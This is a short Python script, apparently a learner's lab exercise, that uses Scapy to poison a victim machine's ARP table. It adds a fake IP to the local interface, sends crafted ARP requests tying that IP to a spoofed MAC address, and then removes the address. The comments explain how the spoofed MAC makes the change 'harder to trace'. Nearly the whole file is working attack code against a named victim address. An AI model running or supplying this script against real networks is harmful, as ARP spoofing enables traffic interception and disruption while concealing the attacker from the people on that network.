from scapy.all import conf,ARP,sendp,Ether,subprocess,get_if_addr,get_if_hwaddr

iface = conf.iface
MyIP= get_if_addr(iface)
MyMAC= get_if_hwaddr(iface)

fake_mac= "08:00:27:aa:97:97"
fake_ip= "192.168.1.45" #must be different, but on the saem subnet as the victim's
ip_victim="192.168.1.101"

#we going to pretend to be the ip of fake_ip variable


subprocess.run(  [  "sudo", "ip" , "addr" , "add" , "192.168.1.45/45" , "dev" , "eth0"   ]    )

#we send just once, using our real info, so the reply comes to us, because otherway the reply will be dropped by the switch
framerequest = Ether(src = MyMAC)/ARP(op = 1 , psrc = fake_ip , pdst = ip_victim , hwsrc = MyMAC)
sendp(framerequest,iface = iface, count = 1)


#inmediatly that, we send another request
#why tho the op =2 does not chage the fake mac addres to the victims ip arp table? i need to use the op = 1 , that is request
#but why? maybe is some sec mechanism on some OSes? maybe is the principle of sending a unreqeusted reply
#it makes sense. is the only way the arpspoof command works, sends multiple replies so 1st the arp keeps updated, and second
#the OS accept it, if i send jsut 1 the earlier accepted, that is the requested,will stay becaseu i jsut send once
#if i cahnge count to 50 , it will change
#regardless of that we chagne the request to the victim so the arp table changes the real mac, the kali mac NIC to a fake one so is kidna harder to trace
#unless using wireshark of course, but is a great example

framerequest = Ether(src = fake_mac)/ARP(op = 1 , psrc = fake_ip , pdst = ip_victim , hwsrc = fake_mac)
sendp(framerequest,iface = iface, count = 1)

subprocess.run ( [ "sudo","ip" , "addr" , "del" , "192.168.1.45/24" , "dev" , "eth0"  ])

